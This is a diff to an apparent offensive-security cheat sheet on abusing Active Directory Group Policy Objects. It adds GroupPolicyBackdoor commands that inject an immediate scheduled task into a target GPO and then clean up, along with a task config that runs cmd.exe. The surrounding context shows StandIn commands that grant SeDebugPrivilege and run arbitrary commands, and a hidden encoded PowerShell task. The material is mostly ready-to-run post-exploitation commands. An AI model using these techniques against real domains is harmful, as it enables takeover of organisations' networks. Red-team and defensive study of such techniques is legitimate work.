@@ -104,7 +104,7 @@ Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
 New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force
 ```
 
-## Abuse GPO with
+## Abuse GPO with StandIn
 
 * [FuzzySecurity/StandIn](https://github.com/FuzzySecurity/StandIn) - StandIn is a small .NET35/45 AD post-exploitation toolkit.
 
@@ -117,6 +117,39 @@ StandIn.exe --gpo --filter Shards --setuserrights user002 --grant "SeDebugPrivil
 
 # Execute a custom command
 StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author "REDHOOK\Administrator" --command "C:\I\do\the\thing.exe" --args "with args"
+```
+
+## Abuse GPO with GroupPolicyBackdoor
+
+* [synacktiv/GroupPolicyBackdoor](https://github.com/synacktiv/GroupPolicyBackdoor) - Group Policy Objects manipulation and exploitation framework
+
+```ps1
+# Add Immediate Task to your target GPO
+python3 gpb.py gpo inject --domain 'corp.com' --dc 'ad01-dc.corp.com' -k --module modules_templates/ImmediateTask_create.ini --gpo-name 'TARGET_GPO'
+
+# Clean
+python3 gpb.py gpo clean --domain 'corp.com' --dc 'ad01-dc.corp.com' -k --state-folder 'state_folders/2025_07_15_075047'
+```
+
+**ImmediateTask_create.ini**:
+
+```ps1
+[MODULECONFIG]
+name = Scheduled Tasks
+type = computer
+
+[MODULEOPTIONS]
+task_type = immediate
+program = cmd.exe
+arguments = /c "whoami > C:\Temp\poc.txt"
+
+[MODULEFILTERS]
+filters =
+    [{
+        "operator": "AND",
+        "type": "Computer Name",
+        "value": "ad01-srv1.corp.com"
+    }]
 ```
 
 ## References
